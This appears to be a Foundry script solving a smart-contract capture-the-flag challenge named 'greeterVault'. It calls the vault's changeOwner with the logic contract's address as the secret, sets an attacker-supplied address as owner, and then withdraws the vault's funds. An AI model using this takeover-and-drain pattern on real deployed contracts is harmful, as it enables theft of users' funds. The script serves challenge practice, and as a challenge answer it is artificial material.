// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console2} from "forge-std/Script.sol";
import {SetUp, VaultLogic} from "../challenges/greeterVault/contracts/greeterVault.sol";

contract VaultLogicScript is Script {
    SetUp public challenge = SetUp(0x2105ba882574c118883c83782Ae809955244Be68);

    function run() public {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        address user = vm.envAddress("USER");

        vm.startBroadcast(deployerPrivateKey);
        address vault = challenge.vault();
        address logic = challenge.logic();
        VaultLogic(vault).changeOwner(
            bytes32(uint256(uint160(logic))),
            payable(user)
        );
        VaultLogic(vault).withdraw();
        vm.stopBroadcast();
    }
}
